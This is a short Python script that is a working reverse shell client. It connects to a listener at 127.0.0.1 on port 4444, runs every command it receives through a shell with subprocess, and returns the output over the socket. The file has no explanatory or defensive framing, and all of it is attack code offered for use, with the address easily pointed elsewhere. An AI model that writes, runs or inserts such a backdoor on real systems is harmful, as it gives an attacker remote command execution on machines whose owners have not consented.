import sys
import socket
import subprocess


def client_func():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ip = '127.0.0.1'
    port = 4444
    try:
        client.connect((ip, port))

        while True:
            command = client.recv(1024)
            command = command.decode()
            op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = op.stdout.read()
            output_error = op.stderr.read()
            client.send(output + output_error)

    except:
        print('[*] Server cannot be reached.')
        client.close()

def main():
    client_func()

if __name__ == '__main__':
    main()